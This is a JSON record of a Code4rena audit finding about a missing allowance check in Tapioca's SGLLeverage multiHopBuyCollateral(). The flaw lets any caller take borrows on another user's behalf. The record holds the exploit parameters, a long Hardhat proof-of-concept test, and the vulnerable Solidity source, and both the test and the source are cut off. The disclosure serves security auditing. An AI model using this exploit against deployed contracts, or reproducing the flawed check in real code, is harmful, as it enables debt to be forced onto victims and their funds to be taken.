{
  "Title": "[H-54] Anybody can buy collateral on behalf of other users without having any allowance using the multiHopBuyCollateral()",
  "Content": "\n*   Malicious actors can buy collateral on behalf of other users without having any allowance to do so.\n*   No unauthorized entity should be allowed to take borrows on behalf of other users.\n\n### Proof of Concept\n\n*   The [`SGLLeverage::multiHopBuyCollateral()`](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLeverage.sol#L21-L56) function allows users to level up cross-chain: Borrow more and buy collateral with it, the function receives as parameters the account that the borrow will be credited to, the amount of collateral to add (if any), the amount that is being borrowed and a couple of other variables.\n\n*   The `SGLLeverage::multiHopBuyCollateral()` function only calls the [`solvent()` modifier](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L120-L127), which will validate that the account is solvent at the end of the operation.\n\n*   The `collateralAmount` variable is used to compute the required number of shares to add the specified `collateralAmount` as extra collateral to the borrower account, then there is a check to validate that the caller has enough allowance to add those shares of collateral, and if so, then the collateral is added and debited to the `from` account\n\n```solidity\n...\n//add collateral\nuint256 collateralShare = yieldBox.toShare(\n    collateralId,\n    collateralAmount,\n    false\n);\n_allowedBorrow(from, collateralShare);\n_addCollateral(from, from, false, 0, collateralShare);\n...\n```\n\n*   After adding the extra collateral (if any), the [execution proceeds to call the `_borrow()` to ask for a borrow specified by the `borrowAmount` parameter, and finally calls the USDO::sendForLeverage().](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLeverage.sol#L43-L55)\n\n*   **The problem is that the function only validates if the caller has enough allowance for the `collateralAmount` to be added, but it doesn't check if the caller has enough allowance for the equivalent of shares of the `borrowAmount` (which is the total amount that will be borrowed!).**\n\n*   **The exploit occurs when** a malicious actor calls the `multiHopBuyCollateral()` sending the values of the parameters as follows:\n    *   `from` => The account that will buy collateral and the borrow will be credited to\n    *   `collateralAmount` => **Set as 0**\n    *   `borrowAmount` => **The maximum amount that the `from` account can borrow without falling into insolvency because of the borrowing**\n\n        *   What will happen is that a malicious actor without any allowance will be able to skip the check that validates if it has enough allowance to add more collateral, and will be able to take the borrow on behalf of the `from` account, because the `borrowShare` (which represents the equivalent shares to take a borrow of `borrowAmount`) is not used to validate if the caller has enough allowance to take that amount of debt on behalf of the `from` account\n\n### Coded a Poc\n\n*   I used the `tapioca-bar-audit/test/singularity.test.ts` as the base for this PoC.\n\n    *   If you'd like to use the original `tapioca-bar-audit/test/singularity.test.ts` file, just make sure to update these two lines as follow:\n\n```solidity\ndiff --git a/singularity.test.ts b/singularity.test.ts.modified\nindex 9c82d10..9ba9c76 100755\n--- a/singularity.test.ts\n+++ b/singularity.test.ts.modified\n@@ -3440,6 +3440,7 @@ describe('Singularity test', () => {\n         it('should bounce between 2 chains', async () => {\n             const {\n                 deployer,\n+                eoa1,\n                 tap,\n                 weth,\n                 createTokenEmptyStrategy,\n@@ -4082,7 +4083,7 @@ describe('Singularity test', () => {\n                 ethers.constants.MaxUint256,\n             );\n\n-            await SGL_10.multiHopBuyCollateral(\n+            await SGL_10.connect(eoa1).multiHopBuyCollateral(\n                 deployer.address,\n                 0,\n                 bigDummyAmount,\n```\n\n*   I highly recommend to create a new test file with the below code snippet for the purpose of validating this vulnerability, ***make sure to create this file in the same folder as the `tapioca-bar-audit/test/singularity.test.ts` file***.\n\n<details>\n\n```solidity\nimport hre, { ethers } from 'hardhat';\nimport { BigNumberish, BytesLike, Wallet } from 'ethers';\nimport { expect } from 'chai';\nimport { BN, getSGLPermitSignature, register } from './test.utils';\nimport {\n    loadFixture,\n    takeSnapshot,\n} from '@nomicfoundation/hardhat-network-helpers';\nimport { LiquidationQueue__factory } from '../gitsub_tapioca-sdk/src/typechain/tapioca-periphery';\nimport {\n    ERC20Mock,\n    ERC20Mock__factory,\n    LZEndpointMock__factory,\n    OracleMock__factory,\n    UniswapV3SwapperMock__factory,\n} from '../gitsub_tapioca-sdk/src/typechain/tapioca-mocks';\nimport { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';\nimport {\n    BaseTOFT,\n    BaseTOFTLeverageModule__factory,\n    BaseTOFTMarketModule__factory,\n    BaseTOFTOptionsModule__factory,\n    BaseTOFTStrategyModule__factory,\n    TapiocaOFT,\n    TapiocaOFT__factory,\n    TapiocaWrapper__factory,\n} from '../gitsub_tapioca-sdk/src/typechain/tapiocaz';\nimport TapiocaOFTArtifact from '../gitsub_tapioca-sdk/src/artifacts/tapiocaz/TapiocaOFT.json';\n\ndescribe('Singularity test', () => {\n    describe('multiHopBuyCollateral()', async () => {\n        const deployYieldBox = async (signer: SignerWithAddress) => {\n            const uriBuilder = await (\n                await ethers.getContractFactory('YieldBoxURIBuilder')\n            ).deploy();\n\n            const yieldBox = await (\n                await ethers.getContractFactory('YieldBox')\n            ).deploy(ethers.constants.AddressZero, uriBuilder.address);\n            return { uriBuilder, yieldBox };\n        };\n\n        const deployLZEndpointMock = async (\n            chainId: number,\n            signer: SignerWithAddress,\n        ) => {\n            const LZEndpointMock = new LZEndpointMock__factory(signer);\n            return await LZEndpointMock.deploy(chainId);\n        };\n\n        const deployTapiocaWrapper = async (signer: SignerWithAddress) => {\n            const TapiocaWrapper = new TapiocaWrapper__factory(signer);\n            return await TapiocaWrapper.deploy(signer.address);\n        };\n\n        const Tx_deployTapiocaOFT = async (\n            lzEndpoint: string,\n            isNative: boolean,\n            erc20Address: string,\n            yieldBoxAddress: string,\n            hostChainID: number,\n            hostChainNetworkSigner: SignerWithAddress,\n        ) => {\n            const erc20 = (\n                await ethers.getContractAt('IERC20Metadata', erc20Address)\n            ).connect(hostChainNetworkSigner);\n\n            const erc20name = await erc20.name();\n            const erc20symbol = await erc20.symbol();\n            const erc20decimal = await erc20.decimals();\n\n            // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n            // @ts-ignore\n\n            const BaseTOFTLeverageModule = new BaseTOFTLeverageModule__factory(\n                hostChainNetworkSigner,\n            );\n            const leverageModule = await BaseTOFTLeverageModule.deploy(\n                lzEndpoint,\n                erc20Address,\n                yieldBoxAddress,\n                erc20name,\n                erc20symbol,\n                erc20decimal,\n                hostChainID,\n            );\n\n            const BaseTOFTStrategyModule = new BaseTOFTStrategyModule__factory(\n                hostChainNetworkSigner,\n            );\n            const strategyModule = await BaseTOFTStrategyModule.deploy(\n                lzEndpoint,\n                erc20Address,\n                yieldBoxAddress,\n                erc20name,\n                erc20symbol,\n                erc20decimal,\n                hostChainID,\n            );\n\n            const BaseTOFTMarketModule = new BaseTOFTMarketModule__factory(\n                hostChainNetworkSigner,\n            );\n            const marketModule = await BaseTOFTMarketModule.deploy(\n                lzEndpoint,\n                erc20Address,\n                yieldBoxAddress,\n                erc20name,\n                erc20symbol,\n                erc20decimal,\n                hostChainID,\n            );\n\n            const BaseTOFTOptionsModule = new BaseTOFTOptionsModule__factory(\n                hostChainNetworkSigner,\n            );\n            const optionsModule = await BaseTOFTOptionsModule.deploy(\n                lzEndpoint,\n                erc20Address,\n                yieldBoxAddress,\n                erc20name,\n                erc20symbol,\n                erc20decimal,\n                hostChainID,\n            );\n\n            const args: Parameters<TapiocaOFT__factory['deploy']> = [\n                lzEndpoint,\n                erc20Address,\n                yieldBoxAddress,\n                erc20name,\n                erc20symbol,\n                erc20decimal,\n                hostChainID,\n                leverageModule.address,\n                strategyModule.address,\n                marketModule.address,\n                optionsModule.address,\n            ];\n\n            const TapiocaOFT = new TapiocaOFT__factory(hostChainNetworkSigner);\n            const txData = TapiocaOFT.getDeployTransaction(...args)\n                .data as BytesLike;\n\n            return { txData, args };\n        };\n\n        const attachTapiocaOFT = async (\n            address: string,\n            signer: SignerWithAddress,\n        ) => {\n            const tapiocaOFT = new ethers.Contract(\n                address,\n                TapiocaOFTArtifact.abi,\n                signer,\n            );\n            return tapiocaOFT.connect(signer);\n        };\n\n        const mintAndApprove = async (\n            erc20Mock: ERC20Mock,\n            toft: BaseTOFT,\n            signer: SignerWithAddress,\n            amount: BigNumberish,\n        ) => {\n            await erc20Mock.freeMint(amount);\n            await erc20Mock.approve(toft.address, amount);\n        };\n\n        it('Attacker will take a borrow on behalf of another user without having any allowance', async () => {\n            const {\n                deployer,\n                eoa1,\n                tap,\n                weth,\n                createTokenEmptyStrategy,\n                deployCurveStableToUsdoBidder,\n                magnetar,\n                createWethUsd0Singularity,\n                registerBigBangMarket,\n                wethUsdcOracle,\n            } = await loadFixture(register);\n\n            //Deploy LZEndpointMock\n            const LZEndpointMock_chainID_0 = await deployLZEndpointMock(\n                0,\n                deployer,\n            );\n            const LZEndpointMock_chainID_10 = await deployLZEndpointMock(\n                10,\n                deployer,\n            );\n\n            //Deploy TapiocaWrapper\n            const tapiocaWrapper_0 = await deployTapiocaWrapper(deployer);\n            const tapiocaWrapper_10 = await deployTapiocaWrapper(deployer);\n\n            //Deploy YB and Strategies\n            const yieldBox0Data = await deployYieldBox(deployer);\n            const YieldBox_0 = yieldBox0Data.yieldBox;\n\n            const usdo_0_leverage = await (\n                await ethers.getContractFactory('USDOLeverageModule')\n            ).deploy(LZEndpointMock_chainID_0.address, YieldBox_0.address);\n            const usdo_0_market = await (\n                await ethers.getContractFactory('USDOMarketModule')\n            ).deploy(LZEndpointMock_chainID_0.address, YieldBox_0.address);\n            const usdo_0_options = await (\n                await ethers.getContractFactory('USDOOptionsModule')\n            ).deploy(LZEndpointMock_chainID_0.address, YieldBox_0.address);\n\n            const USDO_0 = await (\n                await ethers.getContractFactory('USDO')\n            ).deploy(\n                LZEndpointMock_chainID_0.address,\n                YieldBox_0.address,\n                deployer.address,\n                usdo_0_leverage.address,\n                usdo_0_market.address,\n                usdo_0_options.address,\n            );\n            await USDO_0.deployed();\n\n            const usdo_10_leverage = await (\n                await ethers.getContractFactory('USDOLeverageModule')\n            ).deploy(LZEndpointMock_chainID_10.address, YieldBox_0.address);\n            const usdo_10_market = await (\n                await ethers.getContractFactory('USDOMarketModule')\n            ).deploy(LZEndpointMock_chainID_10.address, YieldBox_0.address);\n            const usdo_10_options = await (\n                await ethers.getContractFactory('USDOOptionsModule')\n            ).deploy(LZEndpointMock_chainID_10.address, YieldBox_0.address);\n            const USDO_10 = await (\n                await ethers.getContractFactory('USDO')\n            ).deploy(\n                LZEndpointMock_chainID_10.address,\n                YieldBox_0.address,\n                deployer.address,\n                usdo_10_leverage.address,\n                usdo_10_market.address,\n                usdo_10_options.address,\n            );\n            await USDO_10.deployed();\n\n            //Deploy Penrose\n            const BAR_0 = await (\n                await ethers.getContractFactory('Penrose')\n            ).deploy(\n                YieldBox_0.address,\n                tap.address,\n                weth.address,\n                deployer.address,\n            );\n            await BAR_0.deployed();\n            await BAR_0.setUsdoToken(USDO_0.address);\n\n            //Deploy ERC20Mock\n            const ERC20Mock = new ERC20Mock__factory(deployer);\n            const erc20Mock = await ERC20Mock.deploy(\n                'erc20Mock',\n                'MOCK',\n                0,\n                18,\n                deployer.address,\n            );\n            await erc20Mock.toggleRestrictions();\n\n            // master contract\n            const mediumRiskMC_0 = await (\n                await ethers.getContractFactory('Singularity')\n            ).deploy();\n            await mediumRiskMC_0.deployed();\n            await BAR_0.registerSingularityMasterContract(\n                mediumRiskMC_0.address,\n                1,\n            );\n\n            const mediumRiskMCBigBang_0 = await (\n                await ethers.getContractFactory('BigBang')\n            ).deploy();\n            await mediumRiskMCBigBang_0.deployed();\n            await BAR_0.registerBigBangMasterContract(\n                mediumRiskMCBigBang_0.address,\n                1,\n            );\n\n            //Deploy TapiocaOFT\n            {\n                const txData =\n                    await tapiocaWrapper_0.populateTransaction.createTOFT(\n                        erc20Mock.address,\n                        (\n                            await Tx_deployTapiocaOFT(\n                                LZEndpointMock_chainID_0.address,\n                                false,\n                                erc20Mock.address,\n                                YieldBox_0.address,\n                                31337,\n                                deployer,\n                            )\n                        ).txData,\n                        ethers.utils.randomBytes(32),\n                        false,\n                    );\n                txData.gasLimit = await hre.ethers.provider.estimateGas(txData);\n                await deployer.sendTransaction(txData);\n            }\n            const tapiocaOFT0 = (await attachTapiocaOFT(\n                await tapiocaWrapper_0.tapiocaOFTs(\n                    (await tapiocaWrapper_0.tapiocaOFTLength()).sub(1),\n                ),\n                deployer,\n            )) as TapiocaOFT;\n\n            {\n                const txData =\n                    await tapiocaWrapper_10.populateTransaction.createTOFT(\n                        erc20Mock.address,\n                        (\n                            await Tx_deployTapiocaOFT(\n                                LZEndpointMock_chainID_10.address,\n                                false,\n                                erc20Mock.address,\n                                YieldBox_0.address,\n                                31337,\n                                deployer,\n                            )\n                        ).txData,\n                        ethers.utils.randomBytes(32),\n                        false,\n                    );\n                txData.gasLimit = await hre.ethers.provider.estimateGas(txData);\n                await deployer.sendTransaction(txData);\n            }\n            const tapiocaOFT10 = (await attachTapiocaOFT(\n                await tapiocaWrapper_10.tapiocaOFTs(\n                    (await tapiocaWrapper_10.tapiocaOFTLength()).sub(1),\n                ),\n                deployer,\n            )) as TapiocaOFT;\n\n            //Deploy strategies\n            const Strategy_0 = await createTokenEmptyStrategy(\n                YieldBox_0.address,\n                tapiocaOFT0.address,\n            );\n            const Strategy_10 = await createTokenEmptyStrategy(\n                YieldBox_0.address,\n                tapiocaOFT10.address,\n            );\n\n            // Set trusted remotes\n            const dstChainId0 = await LZEndpointMock_chainID_0.getChainId();\n            const dstChainId10 = await LZEndpointMock_chainID_10.getChainId();\n\n            await USDO_0.setTrustedRemote(\n                dstChainId10,\n                ethers.utils.solidityPack(\n                    ['address', 'address'],\n                    [USDO_10.address, USDO_0.address],\n                ),\n            );\n            await USDO_0.setTrustedRemote(\n                31337,\n                ethers.utils.solidityPack(\n                    ['address', 'address'],\n                    [USDO_10.address, USDO_0.address],\n                ),\n            );\n\n            await USDO_10.setTrustedRemote(\n                dstChainId0,\n                ethers.utils.solidityPack(\n                    ['address', 'address'],\n                    [USDO_0.address, USDO_10.address],\n                ),\n            );\n            await USDO_10.setTrustedRemote(\n                31337,\n                ethers.utils.solidityPack(\n                    ['address', 'address'],\n                    [USDO_0.address, USDO_10.address],\n                ),\n            );\n\n            await tapiocaWrapper_0.executeTOFT(\n                tapiocaOFT0.address,\n                tapiocaOFT0.interface.encodeFunctionData('setTrustedRemote', [\n                    dstChainId10,\n                    ethers.utils.solidityPack(\n                        ['address', 'address'],\n                        [tapiocaOFT10.address, tapiocaOFT0.address],\n                    ),\n                ]),\n                true,\n            );\n\n            await tapiocaWrapper_0.executeTOFT(\n                tapiocaOFT0.address,\n                tapiocaOFT0.interface.encodeFunctionData('setTrustedRemote', [\n                    31337,\n                    ethers.utils.solidityPack(\n                        ['address', 'address'],\n                        [tapiocaOFT10.address, tapiocaOFT0.address],\n                    ),\n                ]),\n                true,\n            );\n\n            await tapiocaWrapper_10.executeTOFT(\n                tapiocaOFT10.address,\n                tapiocaOFT10.interface.encodeFunctionData('setTrustedRemote', [\n                    dstChainId0,\n                    ethers.utils.solidityPack(\n                        ['address', 'address'],\n                        [tapiocaOFT0.address, tapiocaOFT10.address],\n                    ),\n                ]),\n                true,\n            );\n\n            await tapiocaWrapper_10.executeTOFT(\n                tapiocaOFT10.address,\n                tapiocaOFT10.interface.encodeFunctionData('setTrustedRemote', [\n                    dstChainId10,\n                    ethers.utils.solidityPack(\n                        ['address', 'address'],\n                        [tapiocaOFT0.address, tapiocaOFT10.address],\n                    ),\n                ]),\n                true,\n            );\n\n            await tapiocaWrapper_10.executeTOFT(\n                tapiocaOFT10.address,\n                tapiocaOFT10.interface.encodeFunctionData('setTrustedRemote', [\n                    31337,\n                    ethers.utils.solidityPack(\n                        ['address', 'address'],\n                        [tapiocaOFT0.address, tapiocaOFT10.address],\n                    ),\n                ]),\n                true,\n            );\n\n            // Link endpoints with addresses\n            await LZEndpointMock_chainID_0.setDestLzEndpoint(\n                tapiocaOFT0.address,\n                LZEndpointMock_chainID_10.address,\n            );\n            await LZEndpointMock_chainID_10.setDestLzEndpoint(\n                tapiocaOFT0.address,\n                LZEndpointMock_chainID_0.address,\n            );\n            await LZEndpointMock_chainID_0.setDestLzEndpoint(\n                tapiocaOFT0.address,\n                LZEndpointMock_chainID_0.address,\n            );\n\n            await LZEndpointMock_chainID_10.setDestLzEndpoint(\n                tapiocaOFT10.address,\n                LZEndpointMock_chainID_10.address,\n            );\n            await LZEndpointMock_chainID_0.setDestLzEndpoint(\n                tapiocaOFT10.address,\n                LZEndpointMock_chainID_10.address,\n            );\n            await LZEndpointMock_chainID_10.setDestLzEndpoint(\n                tapiocaOFT10.address,\n                LZEndpointMock_chainID_0.address,\n            );\n\n            await LZEndpointMock_chainID_0.setDestLzEndpoint(\n                USDO_10.address,\n                LZEndpointMock_chainID_10.address,\n            );\n            await LZEndpointMock_chainID_0.setDestLzEndpoint(\n                USDO_0.address,\n                LZEndpointMock_chainID_10.address,\n            );\n            await LZEndpointMock_chainID_10.setDestLzEndpoint(\n                USDO_0.address,\n                LZEndpointMock_chainID_0.address,\n            );\n            await LZEndpointMock_chainID_10.setDestLzEndpoint(\n                USDO_10.address,\n                LZEndpointMock_chainID_0.address,\n            );\n\n            //Register tokens on YB\n            await YieldBox_0.registerAsset(\n                1,\n                tapiocaOFT0.address,\n                Strategy_0.address,\n                0,\n            );\n            await YieldBox_0.registerAsset(\n                1,\n                tapiocaOFT10.address,\n                Strategy_10.address,\n                0,\n            );\n\n            const tapiocaOFT0Id = await YieldBox_0.ids(\n                1,\n                tapiocaOFT0.address,\n                Strategy_0.address,\n                0,\n            );\n            const tapiocaOFT10Id = await YieldBox_0.ids(\n                1,\n                tapiocaOFT10.address,\n                Strategy_10.address,\n                0,\n            );\n            expect(tapiocaOFT0Id.gt(0)).to.be.true;\n            expect(tapiocaOFT10Id.gt(0)).to.be.true;\n            expect(tapiocaOFT10Id.gt(tapiocaOFT0Id)).to.be.true;\n\n            const bigDummyAmount = ethers.utils.parseEther('10');\n            await mintAndApprove(\n                erc20Mock,\n                tapiocaOFT0,\n                deployer,\n                bigDummyAmount,\n            );\n            await tapiocaOFT0.wrap(\n                deployer.address,\n                deployer.address,\n                bigDummyAmount,\n            );\n\n            await tapiocaOFT0.approve(\n                YieldBox_0.address,\n                ethers.constants.MaxUint256,\n            );\n            const toDepositShare = await YieldBox_0.toShare(\n                tapiocaOFT0Id,\n                bigDummyAmount,\n                false,\n            );\n            await YieldBox_0.depositAsset(\n                tapiocaOFT0Id,\n                deployer.address,\n                deployer.address,\n                0,\n                toDepositShare,\n            );\n\n            let yb0Balance = await YieldBox_0.amountOf(\n                deployer.address,\n                tapiocaOFT0Id,\n            );\n            expect(yb0Balance.eq(bigDummyAmount)).to.be.true; //bc of the yield\n            const { stableToUsdoBidder, curveSwapper } =\n                await deployCurveStableToUsdoBidder(\n                    YieldBox_0,\n                    tapiocaOFT0,\n                    USDO_0,\n                    false,\n                );\n            let sglMarketData = await createWethUsd0Singularity(\n                USDO_0,\n                tapiocaOFT0,\n                BAR_0,\n                await BAR_0.usdoAssetId(),\n                tapiocaOFT0Id,\n                mediumRiskMC_0,\n                YieldBox_0,\n                stableToUsdoBidder,\n                0,\n            );\n            const SGL_0 = sglMarketData.wethUsdoSingularity;\n\n            sglMarketData = await createWethUsd0Singularity(\n                USDO_0,\n                tapiocaOFT10,\n                BAR_0,\n                await BAR_0.usdoAssetId(),\n                tapiocaOFT10Id,\n                mediumRiskMC_0,\n                YieldBox_0,\n                stableToUsdoBidder,\n                0,\n            );\n            const SGL_10 = sglMarketData.wethUsdoSingularity;\n\n            await tapiocaOFT0.approve(\n                SGL_0.address,\n                ethers.constants.MaxUint256,\n            );\n            await YieldBox_0.setApprovalForAll(SGL_0.address, true);\n            await SGL_0.addCollateral(\n                deployer.address,\n                deployer.address,\n                false,\n                bigDummyAmount,\n                0,\n            );\n            const collateralShare = await SGL_0.userCollateralShare(\n                deployer.address,\n            );\n            expect(collateralShare.gt(0)).to.be.true;\n\n            const collateralAmount = await YieldBox_0.toAmount(\n                tapiocaOFT0Id,\n                collateralShare,\n                false,\n            );\n            expect(collateralAmount.eq(bigDummyAmount)).to.be.true;\n\n            //test wrap\n            await mintAndApprove(\n                erc20Mock,\n                tapiocaOFT10,\n                deployer,\n                bigDummyAmount,\n            );\n            await tapiocaOFT10.wrap(\n                deployer.address,\n                deployer.address,\n                bigDummyAmount,\n            );\n            const tapioca10Balance = await tapiocaOFT10.balanceOf(\n                deployer.address,\n            );\n            expect(tapioca10Balance.eq(bigDummyAmount)).to.be.true;\n\n            await tapiocaOFT10.approve(\n                YieldBox_0.address,\n                ethers.constants.MaxUint256,\n            );\n            await YieldBox_0.depositAsset(\n                tapiocaOFT10Id,\n                deployer.address,\n                deployer.address,\n                0,\n                toDepositShare,\n            );\n\n            yb0Balance = await YieldBox_0.amountOf(\n                deployer.address,\n                tapiocaOFT10Id,\n            );\n            expect(yb0Balance.eq(bigDummyAmount)).to.be.true; //bc of the yield\n\n            await tapiocaOFT10.approve(\n                SGL_10.address,\n                ethers.constants.MaxUint256,\n            );\n            await YieldBox_0.setApprovalForAll(SGL_10.address, true);\n            await SGL_10.addCollateral(\n                deployer.address,\n                deployer.address,\n                false,\n                bigDummyAmount,\n                0,\n            );\n\n            const sgl10CollateralShare = await SGL_10.userCollateralShare(\n                deployer.address,\n            );\n            expect(sgl10CollateralShare.eq(collateralShare)).to.be.true;\n            const UniswapV3SwapperMock = new UniswapV3SwapperMock__factory(\n                deployer,\n            );\n            const uniV3SwapperMock = await UniswapV3SwapperMock.deploy(\n                ethers.constants.AddressZero,\n            );\n\n            //lend some USD0 to SGL_10\n            const oraclePrice = BN(1).mul((1e18).toString());\n            const OracleMock = new OracleMock__factory(deployer);\n            const oracleMock = await OracleMock.deploy(\n                'WETHMOracle',\n                'WETHMOracle',\n                (1e18).toString(),\n            );\n            await wethUsdcOracle.deployed();\n            await wethUsdcOracle.set(oraclePrice);\n\n            const { bigBangMarket } = await registerBigBangMarket(\n                mediumRiskMCBigBang_0.address,\n                YieldBox_0,\n                BAR_0,\n                weth,\n                await BAR_0.wethAssetId(),\n                oracleMock,\n                0,\n                0,\n                0,\n                0,\n                0,\n            );\n            await weth.freeMint(bigDummyAmount.mul(5));\n            await weth.approve(\n                bigBangMarket.address,\n                ethers.constants.MaxUint256,\n            );\n            await weth.approve(YieldBox_0.address, ethers.constants.MaxUint256);\n            await YieldBox_0.setApprovalForAll(bigBangMarket.address, true);\n            await YieldBox_0.depositAsset(\n                await BAR_0.wethAssetId(),\n                deployer.address,\n                deployer.address,\n                bigDummyAmount.mul(5),\n                0,\n            );\n            await bigBangMarket.addCollateral(\n                deployer.address,\n                deployer.address,\n                false,\n                bigDummyAmount.mul(5),\n                0,\n            );\n            const bigBangCollateralShare =\n                await bigBangMarket.userCollateralShare(deployer.address);\n            expect(bigBangCollateralShare.gt(0)).to.be.true;\n\n            const collateralIdSaved = await bigBangMarket.collateralId();\n            const wethId = await BAR_0.wethAssetId();\n            expect(collateralIdSaved.eq(wethId)).to.be.true;\n\n            await USDO_0.setMinterStatus(bigBangMarket.address, true);\n            await bigBangMarket.borrow(\n                deployer.address,\n                deployer.address,\n                bigDummyAmount.mul(3),\n            );\n\n            const usdoBorrowPart = await bigBangMarket.userBorrowPart(\n                deployer.address,\n            );\n            expect(usdoBorrowPart.gt(0)).to.be.true;\n\n            await YieldBox_0.withdraw(\n                await bigBangMarket.assetId(),\n                deployer.address,\n                deployer.address,\n                bigDummyAmount.mul(3),\n                0,\n            );\n            const usdoBalance = await USDO_0.balanceOf(deployer.address);\n            expect(usdoBalance.gt(0)).to.be.true;\n\n            const usdoBalanceShare = await YieldBox_0.toShare(\n                await bigBangMarket.assetId(),\n                usdoBalance.div(2),\n                false,\n            );\n            await USDO_0.approve(\n                YieldBox_0.address,\n                ethers.constants.MaxUint256,\n            );\n            await YieldBox_0.depositAsset(\n                await bigBangMarket.assetId(),\n                deployer.address,\n                deployer.address,\n                usdoBalance.div(2),\n                0,\n            );\n            await SGL_10.addAsset(\n                deployer.address,\n                deployer.address,\n                false,\n                usdoBalanceShare,\n            );\n            const totalSGL10Asset = await SGL_10.totalAsset();\n            expect(totalSGL10Asset[0].gt(0)).to.be.true;\n\n            let airdropAdapterParamsDst = hre.ethers.utils.solidityPack(\n                ['uint16', 'uint', 'uint', 'address'],\n                [\n                    2,\n                    1_000_000, //extra gas limit; min 200k\n                    ethers.utils.parseEther('2'), //amount of eth to airdrop\n                    USDO_10.address,\n                ],\n            );\n\n            const airdropAdapterParamsSrc = hre.ethers.utils.solidityPack(\n                ['uint16', 'uint', 'uint', 'address'],\n                [\n                    2,\n                    1_000_000, //extra gas limit; min 200k\n                    ethers.utils.parseEther('1'), //amount of eth to airdrop\n                    magnetar.address,\n                ],\n            );\n\n            const sgl10Asset = await SGL_10.asset();\n            expect(sgl10Asset).to.eq(USDO_0.address);\n\n            const userCollateralShareBefore = await SGL_0.userCollateralShare(\n                deployer.address,\n            );\n            expect(userCollateralShareBefore.eq(bigDummyAmount.m",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-07-tapioca",
  "Code": [
    {
      "filename": "contracts/markets/singularity/SGLLeverage.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"./SGLLendingCommon.sol\";\nimport {IUSDOBase} from \"tapioca-periph/contracts/interfaces/IUSDO.sol\";\nimport {ITapiocaOFT} from \"tapioca-periph/contracts/interfaces/ITapiocaOFT.sol\";\n\n/// @title Singularity leverage module\n/// @notice Singularity module for leverage type actions\ncontract SGLLeverage is SGLLendingCommon {\n    using RebaseLibrary for Rebase;\n    using BoringERC20 for IERC20;\n\n    /// @notice Level up cross-chain: Borrow more and buy collateral with it.\n    /// @param from The user who sells\n    /// @param collateralAmount Extra collateral to be added\n    /// @param borrowAmount Borrowed amount that will be swapped into collateral\n    /// @param swapData Swap data used on destination chain for swapping USDO to the underlying TOFT token\n    /// @param lzData LayerZero specific data\n    /// @param externalData External contracts used for the cross chain operation\n    function multiHopBuyCollateral(\n        address from,\n        uint256 collateralAmount,\n        uint256 borrowAmount,\n        IUSDOBase.ILeverageSwapData calldata swapData,\n        IUSDOBase.ILeverageLZData calldata lzData,\n        IUSDOBase.ILeverageExternalContractsData calldata externalData\n    ) external payable notPaused solvent(from) {\n        require(\n            penrose.swappers(ISwapper(externalData.swapper)),\n            \"SGL: Invalid swapper\"\n        );\n\n        //add collateral\n        uint256 collateralShare = yieldBox.toShare(\n            collateralId,\n            collateralAmount,\n            false\n        );\n        _allowedBorrow(from, collateralShare);\n        _addCollateral(from, from, false, 0, collateralShare);\n\n        //borrow\n        (, uint256 borrowShare) = _borrow(from, from, borrowAmount);\n\n        //withdraw\n        yieldBox.withdraw(assetId, from, address(this), 0, borrowShare);\n\n        IUSDOBase(address(asset)).sendForLeverage{value: msg.value}(\n            borrowAmount,\n            from,\n            lzData,\n            swapData,\n            externalData\n        );\n    }\n\n    function multiHopSellCollateral(\n        address from,\n        uint256 share,\n        IUSDOBase.ILeverageSwapData calldata swapData,\n        IUSDOBase.ILeverageLZData calldata lzData,\n        IUSDOBase.ILeverageExternalContractsData calldata externalData\n    ) external payable notPaused solvent(from) {\n        require(\n            penrose.swappers(ISwapper(externalData.swapper)),\n            \"SGL: Invalid swapper\"\n        );\n\n        _allowedBorrow(from, share);\n        _removeCollateral(from, address(this), share);\n        (uint256 amountOut, ) = yieldBox.withdraw(\n            collateralId,\n            address(this),\n            address(this),\n            0,\n            share\n        );\n\n        //send for unwrap\n        ITapiocaOFT(address(collateral)).sendForLeverage{value: msg.value}(\n            amountOut,\n            from,\n            lzData,\n            swapData,\n            externalData\n        );\n    }\n\n    /// @notice Lever down: Sell collateral to repay debt; excess goes to YB\n    /// @param from The user who sells\n    /// @param share Collateral YieldBox-shares to sell\n    /// @param minAmountOut Mininal proceeds required for the sale\n    /// @param swapper Swapper to execute the sale\n    /// @param dexData Additional data to pass to the swapper\n    /// @return amountOut Actual asset amount received in the sale\n    function sellCollateral(\n        address from,\n        uint256 share,\n        uint256 minAmountOut,\n        ISwapper swapper,\n        bytes calldata dexData\n    ) external notPaused solvent(from) returns (uint256 amountOut) {\n        require(penrose.swappers(swapper), \"SGL: Invalid swapper\");\n\n        _allowedBorrow(from, share);\n        _removeCollateral(from, address(swapper), share);\n        ISwapper.SwapData memory swapData = swapper.buildSwapData(\n            collateralId,\n            assetId,\n            0,\n            share,\n            true,\n            true\n        );\n        uint256 shareOut;\n        (amountOut, shareOut) = swapper.swap(\n            swapData,\n            minAmountOut,\n            from,\n            dexData\n        );\n        // As long as the ratio is correct, we trust `amountOut` resp.\n        // `shareOut`, because all money received by the swapper gets used up\n        // one way or another, or the transaction will revert.\n        require(amountOut >= minAmountOut, \"SGL: not enough\");\n        uint256 partOwed = userBorrowPart[from];\n        uint256 amountOwed = totalBorrow.toElastic(partOwed, true);\n        uint256 shareOwed = yieldBox.toShare(assetId, amountOwed, true);\n        if (shareOwed <= shareOut) {\n            _repay(from, from, false, partOwed);\n        } else {\n            //repay as much as we can\n            uint256 partOut = totalBorrow.toBase(amountOut, false);\n            _repay(from, from, false, partOut);\n        }\n    }\n\n    /// @notice Lever up: Borrow more and buy collateral with it.\n    /// @param from The user who buys\n    /// @param borrowAmount Amount of extra asset borrowed\n    /// @param supplyAmount Amount of asset supplied (down payment)\n    /// @param minAmountOut Mininal collateral amount to receive\n    /// @param swapper Swapper to execute the purchase\n    /// @param dexData Additional data to pass to the swapper\n    /// @return amountOut Actual collateral amount purchased\n    function buyCollateral(\n        address from,\n        uint256 borrowAmount,\n        uint256 supplyAmount,\n        uint256 